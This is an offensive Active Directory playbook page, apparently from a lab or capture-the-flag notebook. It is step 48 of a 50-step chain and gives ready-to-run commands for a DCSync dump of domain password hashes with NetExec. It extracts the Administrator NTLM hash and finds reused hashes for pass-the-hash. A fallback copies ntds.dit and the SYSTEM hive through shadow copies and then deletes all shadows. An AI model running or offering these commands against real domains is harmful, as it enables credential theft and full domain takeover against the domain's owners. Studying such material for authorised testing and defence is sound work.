# AD - DCSync Dump

**Step 48 of 50 · AD**

*Use replication rights to dump domain hashes and extract the Administrator hash without printing it.*

## Run this

```bash
netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds | tee $BoxDir/loot/ntds-output.txt
cp /home/kali/.nxc/logs/ntds/$NtdsFile $BoxDir/loot/dcsync.ntds
AdminHash=$(awk -F: '$1 ~ /Administrator$/ {print $4; exit}' $BoxDir/loot/dcsync.ntds)
```

## Example output

```

RemoteOperations failed: rpc_s_access_denied
Dumping the NTDS
Administrator:500:...:HASH
...
```
If Impacket `secretsdump.py` returns `ERROR_DS_DRA_BAD_DN`, fall back to NetExec:

```bash
netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds | tee $BoxDir/loot/ntds-output.txt
```

Check whether multiple accounts share the same NTLM hash (password reuse):

```bash
# Identical hashes in the NTDS dump = same password — all accounts can be PTH'd
awk -F: '{print $4}' $BoxDir/loot/dcsync.ntds | sort | uniq -d
```

## What did you get?

- [ ] NTDS hashes were dumped → **Set `$AdminHash` privately and go to Step 49 · [[AD - Pass the Hash]]**
- [ ] RemoteOperations failed but DRSUAPI completed → **Treat the dump as successful and go to Step 49 · [[AD - Pass the Hash]]**
- [ ] Impacket returned `ERROR_DS_DRA_BAD_DN` → **Use NetExec `--ntds` instead**
- [ ] DCSync is denied → **Go to Step 47 · [[AD - DCSync Grant]]**
- [ ] The command reports clock skew → **Go to Step 35 · [[AD - Clock Sync]]**
- [ ] Clock skew is too large for any Kerberos tool and cannot be fixed → **Use VSS to extract NTDS without Kerberos:**
  ```powershell
  vssadmin create shadow /for=C:
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\System32\config\SYSTEM C:\Windows\Temp\sys2.save
  vssadmin delete shadows /all /quiet
  ```
  Download both files, then parse locally:
  ```bash
  secretsdump.py LOCAL -ntds $BoxDir/loot/ntds.dit -system $BoxDir/loot/sys2.save -just-dc-ntlm
  ```
  This requires SYSTEM privileges, so use GodPotato or a similar token abuse tool first.

## Notes

When multiple accounts share the same NTLM hash, PTH works for all of them — useful if the Administrator hash fails but another domain admin's hash is present.

## Gotcha

> [!warning] 💡
> RemoteOperations access denied can appear before a successful DRSUAPI dump. Read the complete output before deciding it failed.

> [!warning] 💡
> A domain controller's SAM hive contains local accounts only. Domain account hashes are stored in `ntds.dit`; use the SYSTEM hive with it for offline parsing.
